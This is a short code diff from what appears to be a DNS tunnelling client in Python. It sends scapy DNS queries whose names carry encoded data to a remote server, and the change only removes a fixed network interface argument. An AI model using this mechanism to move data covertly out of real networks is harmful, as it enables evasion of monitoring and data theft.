@@ -47,7 +47,7 @@ class Client:
             try:
                 request_packet = IP(dst=nameserver)/UDP()/DNS(
                     rd=1, qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")])
-                send(request_packet, iface='eth0', verbose=False)
+                send(request_packet, verbose=False)
             except socket.gaierror:
                 pass
             except KeyboardInterrupt:
